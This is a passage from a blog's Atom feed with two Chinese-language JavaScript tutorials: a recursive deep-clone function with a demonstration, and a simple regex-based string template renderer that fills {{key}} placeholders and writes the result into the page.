class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//深度克隆</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result,oClass=isClass(obj);</span><br><span class="line">        <span class="comment">//确定result的类型</span></span><br><span class="line">    <span class="keyword">if</span>(oClass===<span class="string">"Object"</span>)&#123;</span><br><span class="line">        result=&#123;&#125;;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(oClass===<span class="string">"Array"</span>)&#123;</span><br><span class="line">        result=[];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(key <span class="keyword">in</span> obj)&#123;</span><br><span class="line">        <span class="keyword">var</span> copy=obj[key]; </span><br><span class="line">        <span class="keyword">if</span>(isClass(copy)==<span class="string">"Object"</span> || isClass(copy)==<span class="string">"Array"</span>)&#123;</span><br><span class="line">            result[key]=<span class="built_in">arguments</span>.callee(copy);<span class="comment">//递归调用</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="comment">//如果为基本数据类型</span></span><br><span class="line">            result[key]=obj[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回传递给他的任意对象的类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isClass</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(o===<span class="literal">null</span>) <span class="keyword">return</span> <span class="string">"Null"</span>;</span><br><span class="line">    <span class="keyword">if</span>(o===<span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"Undefined"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(o).slice(<span class="number">8</span>,<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> oPerson=&#123;</span><br><span class="line">    oName:<span class="string">"rookiebob"</span>,</span><br><span class="line">    oAge:<span class="string">"18"</span>,</span><br><span class="line">    oAddress:&#123;</span><br><span class="line">        province:<span class="string">"beijing"</span></span><br><span class="line">    &#125;,    </span><br><span class="line">    ofavorite:[</span><br><span class="line">        <span class="string">"swimming"</span>,</span><br><span class="line">        &#123;<span class="attr">reading</span>:<span class="string">"history book"</span>&#125;</span><br><span class="line">    ],</span><br><span class="line">    skill:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"bob is coding"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//深度克隆一个对象</span></span><br><span class="line"><span class="keyword">var</span> oNew=deepClone(oPerson);</span><br><span class="line"> </span><br><span class="line">oNew.ofavorite[<span class="number">1</span>].reading=<span class="string">"picture"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(oNew.ofavorite[<span class="number">1</span>].reading);<span class="comment">//picture</span></span><br><span class="line"><span class="built_in">console</span>.log(oPerson.ofavorite[<span class="number">1</span>].reading);<span class="comment">//history book</span></span><br><span class="line"> </span><br><span class="line">oNew.oAddress.province=<span class="string">"shanghai"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(oPerson.oAddress.province);<span class="comment">//beijing</span></span><br><span class="line"><span class="built_in">console</span>.log(oNew.oAddress.province);<span class="comment">//shanghai</span></span><br></pre></td></tr></table></figure><blockquote><p>整理自：<a href="http://www.jianshu.com/p/ddc2bc57be55" target="_blank" rel="noopener">浅拷贝VS深拷贝</a><br><a href="http://www.zyy1217.com/2017/01/05/Javascript%E6%B7%B1%E5%85%8B%E9%9A%86%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">Javascript深克隆原理与实现</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅克隆与深克隆&quot;&gt;&lt;a href=&quot;#浅克隆与深克隆&quot; class=&quot;headerlink&quot; title=&quot;浅克隆与深克隆&quot;&gt;&lt;/a&gt;浅克隆与深克隆&lt;/h1&gt;&lt;h2 id=&quot;一-js中的对象&quot;&gt;&lt;a href=&quot;#一-js中的对象&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>字符串模版</title>
    <link href="http://yoursite.com/2017/09/13/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A8%A1%E7%89%88/"/>
    <id>http://yoursite.com/2017/09/13/实现一个简单的字符串模版/</id>
    <published>2017-09-12T16:06:20.000Z</published>
    <updated>2017-09-12T16:06:20.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>先了解以下什么是字符串模版（模板引擎）<a href="http://www.jianshu.com/p/da57098f992a" target="_blank" rel="noopener">http://www.jianshu.com/p/da57098f992a</a><br> 目标：需要将字符串中所有使用花括号括起来的关键词，同义替换为对象字面量中对应的键值。</p></blockquote><pre><code>字符串: &apos;&lt;a href={{href}}&gt;{{text}}&lt;/a&gt;&apos;对象字面量:{href:&apos;blog.hackerwen.tech&apos; ,text:&apos;我的博客&apos;}结果: &lt;a href=&quot;blog.hackerwen.tech&quot;&gt;我的博客&lt;/a&gt;</code></pre><p>render.js</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render(template,<span class="keyword">context</span>) &#123;</span><br><span class="line"><span class="comment">// 准备正则 匹配至少一个 字母</span></span><br><span class="line"><span class="comment">// 正则的 开始是 &#123;&#123;  结束是 &#125;&#125;</span></span><br><span class="line"><span class="comment">// 中间的 小括号 可以对 正则 筛选出来的 字符串 再次筛选</span></span><br><span class="line">  <span class="keyword">var</span> <span class="keyword">reg</span> = /&#123;&#123;(\w+)&#125;&#125;/;</span><br><span class="line"><span class="comment">// 准备挖好坑的字符串</span></span><br><span class="line">  <span class="keyword">var</span> template = template;</span><br><span class="line"><span class="comment">// 准备 用来填坑的 对象</span></span><br><span class="line">  <span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">context</span>;</span><br><span class="line"><span class="comment">// 首先 使用正则对象 验证一次 字符串 while 会看 result 是否有值</span></span><br><span class="line"><span class="comment">// 这一次 找到的 有两个值</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    第一个  &#123;&#123;href&#125;&#125; 索引为0</span></span><br><span class="line"><span class="comment">    第二个 href  索引为1,小括号找到的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  <span class="keyword">while</span>( result = <span class="keyword">reg</span><span class="variable">.exec</span>(template))&#123;</span><br><span class="line">      console<span class="variable">.log</span>(result);<span class="comment">// 0:&#123;&#123;href&#125;&#125; 1:href</span></span><br><span class="line">      <span class="comment">// 获取 匹配的 key(href)</span></span><br><span class="line">      <span class="keyword">var</span> key = result[<span class="number">1</span>];</span><br><span class="line">      <span class="comment">// 通过key 获取value</span></span><br><span class="line">      <span class="keyword">var</span> value = <span class="keyword">context</span>[key];</span><br><span class="line">      <span class="comment">// 替换  替换的是 &#123;&#123;href&#125;&#125;</span></span><br><span class="line">      template = template<span class="variable">.replace</span>(result[<span class="number">0</span>],value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 执行完毕 </span></span><br><span class="line">  <span class="keyword">return</span> template;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.html<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//导入写好的函数</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">'render.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">//定义模版</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/template"</span> <span class="attr">id</span>=<span class="string">'template'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123;href&#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span><span class="template-variable">&#123;&#123;text&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// 通过标签获取模版</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> templateDom = <span class="built_in">document</span>.querySelector(<span class="string">"#template"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> template = templateDom.innerHTML;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(template);//<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123;href&#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span><span class="template-variable">&#123;&#123;text&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// 准备对象</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> context = &#123;</span></span><br><span class="line"><span class="actionscript">    href:<span class="string">"http://blog.hackerwen.tech"</span>,</span></span><br><span class="line"><span class="actionscript">    text:<span class="string">"我的博客"</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 进行替换</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> resultStr = render(template,context);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(resultStr);</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 添加到页面上</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.innerHTML = resultStr;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>对正则表达式小括号使用方法不清楚的同学可以<a href="https://segmentfault.com/q/1010000004160141?_ea=511644" target="_blank" rel="noopener">戳这里</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;先了解以下什么是字符串模版（模板引擎）&lt;a href=&quot;http://www.jianshu.com/p/da57098f992a&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.jianshu.com/p/d
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
</feed>
